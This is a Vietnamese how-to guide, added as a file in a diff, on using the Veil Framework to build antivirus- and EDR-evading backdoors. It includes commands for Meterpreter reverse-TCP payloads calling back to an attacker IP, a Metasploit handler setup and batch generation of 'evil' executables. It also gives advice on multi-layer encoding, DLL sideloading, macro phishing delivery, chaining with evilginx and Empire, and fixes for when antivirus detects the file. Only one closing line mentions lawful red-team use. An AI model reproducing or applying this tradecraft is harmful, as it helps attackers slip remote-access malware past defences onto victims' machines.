@@ -1,0 +1,157 @@
+1. Veil Framework là gì?
+
+    Veil là framework tạo loader, dropper, shellcode, payload evade AV/EDR trên Windows (chủ yếu), giúp bypass signature, heuristics, static/behavioral detection của antivirus/endpoint.
+
+    Tạo file backdoor (.exe, .bat, .ps1, .py, .c, .cs, .dll, ...), chèn payload (reverse shell, meterpreter, shellcode tự code), encode, obfuscate, random hóa cấu trúc, đa dạng hóa file.
+
+    Tự động hóa, module loader phong phú: Powershell, C, Python, Nim, Ruby, HTA, VBScript, macro...
+
+2. Cài đặt Veil mới nhất (2024-2025)
+A. Cài trên Kali/Ubuntu (Kali có sẵn)
+
+sudo apt update
+sudo apt install veil
+
+B. Cài bản mới nhất từ GitHub
+
+git clone https://github.com/Veil-Framework/Veil.git
+cd Veil
+sudo ./config/setup.sh --force --silent
+
+    Lưu ý:
+
+        Cần Python 3.x, wine (trên Linux), mono (build .NET), các tool encode hỗ trợ.
+
+        Chạy lần đầu sẽ tự động install dependencies.
+
+C. Chạy Veil
+
+veil
+
+    Giao diện CLI menu.
+
+3. Workflow sử dụng Veil Framework
+A. Chọn payload/loader
+
+    Veil chia thành 3 nhóm chính:
+
+        Evasion: Tạo loader (EXE, PY, PS1, CS, C, VB, HTA, macro…)
+
+        Tools: Một số công cụ hỗ trợ như virustotal checker, encrypt shellcode, encoder
+
+        Ordnance: Shellcode raw, phục vụ inject vào loader custom
+
+B. Tạo reverse shell/meterpreter (tích hợp msfvenom)
+
+    Chọn payload (ví dụ: evasion → python/meterpreter/rev_tcp)
+
+    Nhập thông tin LHOST, LPORT (máy nhận kết nối reverse)
+
+    Chọn kiểu encode, obfuscate (Nim, py, c, cs, shellcode hoặc macro…)
+
+    Đặt tên file output
+
+    Veil sẽ build và export file đã encode/obfuscate – sẵn sàng upload/send/phishing
+
+C. Nhận shell/meterpreter
+
+    Dùng msfconsole:
+
+    use exploit/multi/handler
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set LHOST <ip>
+    set LPORT <port>
+    run
+
+    Khi victim chạy file, shell/meterpreter sẽ callback về cho bạn.
+
+4. Nâng cao – bypass AV/EDR mạnh mẽ
+A. Module loader đa dạng
+
+    Loader bằng Python, C, C#, Nim, Ruby, Powershell, HTA, macro, dll, bat, js…
+
+    Càng random/càng lạ → càng dễ evade AV signature
+
+    Thường dùng: python, nim, c, cs, ps1, hta, macro
+
+B. Encode nhiều vòng
+
+    Veil tự động encode nhiều lớp (xor, base64, rc4, aes, caesar, zlib…)
+
+    Có thể encode shellcode msfvenom sẵn hoặc raw, chèn vào loader
+
+    Dùng module tools/encrypt_shellcode để encode riêng
+
+C. Tùy biến shellcode
+
+    Dùng shellcode custom (msfvenom -f raw), patch vào loader
+
+    Tích hợp shellter/donut/nim loader để tạo shellcode từ .NET, PE, reflective loader
+
+D. Patch PE hoặc sideload dll
+
+    Build file .dll bằng Veil, dùng cho DLL hijack hoặc reflective loading (Bypass AV mạnh hơn .exe thường)
+
+E. Macro/phishing
+
+    Export file macro (.vba, .ps1, .hta) – nhúng vào Word/Excel, phishing email, hoặc fake update
+
+5. Automation & scripting với Veil
+
+    Batch generate: Script tạo nhiều loader với random cấu trúc, shellcode, filename, hash, tránh AV signature
+
+    veil -p python/meterpreter/rev_tcp --ip 10.10.14.99 --port 4444 --output evil1.py
+    veil -p c/meterpreter/rev_tcp --ip 10.10.14.99 --port 4444 --output evil2.exe
+
+    Combine với msfvenom: Tạo shellcode raw, encode mạnh, patch vào loader bằng Veil
+
+    Automation phishing: Chain Veil + macro4shell, evilginx, beef, chisel, powershell-empire cho attack campaign
+
+6. Một số workflow, trick thực chiến
+
+    Test file evade trên máy ảo clean trước khi deploy thực tế, kiểm tra hash, signature, behavior.
+
+    Thường xuyên update Veil, database AV signature – AV ngày càng mạnh.
+
+    Combine nhiều loader, đa nền tảng (c, nim, cs, py) để né rule AV.
+
+    Chain Veil với Shellter, Donut, Nim, Go loader để tăng khả năng evade, khó detect.
+
+    Patch file đã tạo với Shellter/Donut tiếp lần 2 để tăng random hóa/stealth.
+
+7. Fix lỗi thực tế
+Lỗi	Fix
+File tạo ra không chạy	Đúng arch, test trên win x86/x64, cài đủ Python/.NET/VCRedist nếu cần
+Không kết nối về handler	LHOST/LPORT sai, firewall, port NAT, check payload đúng loại
+AV detect file	Đổi loader khác, encode thêm, đổi shellcode, test Nim/HTA, chain thêm tool
+File macro không thực thi	Bật macro, tắt protected view, build đúng định dạng
+Veil lỗi phụ thuộc	Chạy setup.sh lại, cài python3, wine, mono, v.v.
+Không chạy được trên Windows mới	Build bằng C#/Nim/HTA, update Veil, test lại loader
+8. So sánh Veil với các tool evade khác
+Tool	Ưu điểm Veil	Khác biệt
+Veil	Loader đa dạng, encode mạnh, automation tốt, bypass AV mạnh nhất, custom shellcode, macro, phishing	Chủ yếu cho Windows, đôi khi false positive, cần update thường xuyên
+Shellter	Patch file PE stealth, random hóa mạnh	Không generate file mới, phải có file hợp pháp sẵn
+Donut	Loader .NET/PE reflective, process hollowing, multi-platform	Chỉ xuất shellcode, phải tự viết loader, không xuất .exe sẵn
+msfvenom	Tạo payload mọi nền tảng, encode, xuất file, nhanh	Dễ bị detect khi xuất file mới, không encode loader mạnh bằng Veil
+Nim/Go loader	Loader tự code, evade tốt, khó bị detect	Phải biết code, không automation menu như Veil
+9. Tài liệu, link hữu ích
+
+    Veil Framework Github
+
+    Veil Docs
+
+    PayloadAllTheThings – AV Evasion
+
+    Hacktricks AV Evasion
+
+    Shellter
+
+    Donut
+
+    Macro4Shell
+
+Tóm tắt nhanh
+
+    Veil Framework: công cụ tạo loader, backdoor, dropper, macro evade AV/EDR mạnh nhất cho pentest/red team – module đa dạng, encode mạnh, random hóa, tích hợp msfvenom/shellcode custom, automation phishing/lab.
+
+    Nên chain encode, đổi loader, patch tiếp với Shellter/Donut/Nim loader, test máy ảo sạch, dùng hợp pháp (Red Team, lab, training).
